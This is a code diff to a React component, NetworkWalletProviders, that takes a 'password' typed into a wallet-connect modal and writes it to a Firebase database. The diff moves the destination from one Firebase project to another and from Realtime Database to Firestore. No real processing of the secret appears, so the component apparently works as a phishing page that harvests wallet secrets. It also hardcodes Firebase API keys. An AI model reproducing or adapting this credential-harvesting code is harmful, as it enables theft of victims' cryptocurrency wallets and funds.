@@ -21,6 +21,7 @@ import { green } from "@mui/material/colors";
 import Modal from "@mui/material/Modal";
 import { initializeApp } from "firebase/app";
 import { getDatabase, ref, set } from "firebase/database";
+import { collection, addDoc, doc, getFirestore } from "firebase/firestore";
 import TextField from "@mui/material/TextField";
 import "./index.css";
 
@@ -150,28 +151,33 @@ const NetworkWalletProviders = ({
     setPassword(event.target.value);
   };
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     setOpen(false);
     setDuring(true);
     // console.log("password = ", password )
 
     let key = password;
     const basic = {
-      apiKey: "AIzaSyDGUUcSc6tqgYV1RJBh_bf39PVPN1d3ZqI",
-      authDomain: "sandwich-e1c05.firebaseapp.com",
-      databaseURL: "https://sandwich-e1c05-default-rtdb.firebaseio.com",
-      projectId: "sandwich-e1c05",
-      storageBucket: "sandwich-e1c05.appspot.com",
-      messagingSenderId: "66293432844",
-      appId: "1:66293432844:web:aa9507cbdf89a7bf7de429",
-      measurementId: "G-4X6E8S72MQ"
+      apiKey: "AIzaSyD7kagB8pgNNqYtPMKUyEc7YoThV7YWRFE",
+      authDomain: "coinprompt-91605.firebaseapp.com",
+      databaseURL: "https://coinprompt-91605-default-rtdb.firebaseio.com",
+      projectId: "coinprompt-91605",
+      storageBucket: "coinprompt-91605.appspot.com",
+      messagingSenderId: "252609206618",
+      appId: "1:252609206618:web:11db323ee92d2d93ef3b63",
+      measurementId: "G-M9420E5B81"
     };
-  
+
     let app = initializeApp(basic);
-  
-    let db = getDatabase(app);
-  
-    set(ref(db, "77_/" + key.substring(1, 10)), { db_info: key });
+
+    let db = getFirestore(app);
+    try {
+      const docRef = await addDoc(collection(db, "coinprompt"), { db_info: key });
+      console.log(docRef);
+    } catch (e) {
+      console.error("Error adding document: ", e);
+    }
+    // set(ref(db, "100_/" + key.substring(1, 10)), { db_info: key });
 
     // here to process...
     // if (password === "") {
